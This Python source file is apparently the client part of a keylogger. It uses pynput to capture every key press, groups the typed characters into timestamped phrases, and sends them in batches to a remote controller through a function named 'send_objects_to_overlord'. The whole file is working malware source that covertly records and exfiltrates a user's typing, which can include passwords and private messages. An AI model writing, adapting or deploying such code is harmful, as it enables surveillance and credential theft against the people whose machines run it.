from pynput.keyboard import Key, Listener
from client import bot
from models.phrasestroke import PhraseStroke
from datetime import datetime

def get_current_time():
    return datetime.now()

class KeyListener:
    BUFFER_CAPACITY = 2

    def __init__(self):
        self.initialize_ivars()

    def initialize_ivars(self):
        self.buffered = []
        self.reset_for_next_phrase()

    def reset_for_next_phrase(self):
        self.current_phrase = ""
        self.start_timestamp = None

    def run(self):
        with Listener(on_press=lambda key: self.on_press(key)) as listener:
            listener.join()

    def on_press(self, key):
        try:
            a_key = key.char.encode('utf-8').strip()
        except AttributeError, UnicodeEncodeError:
            a_key = str(key)
        # avoid key.backspace, TODO make list of keys that terminate a phrase (tab, enter)
        if "Key." in a_key and self.current_phrase is not "":
            self.buffered.append(PhraseStroke(self.start_timestamp,
                                              self.current_phrase,
                                              terminating=a_key))
            self.reset_for_next_phrase()
            return

        if self.current_phrase is "":
            self.start_timestamp = get_current_time()
        self.current_phrase += a_key

        if len(self.buffered) >= self.BUFFER_CAPACITY:
            bot.send_objects_to_overlord(self.buffered)
            # Flush buffer
            self.initialize_ivars()


def main():
    key_listener = KeyListener()
    key_listener.run()

if __name__ == '__main__':
    main()
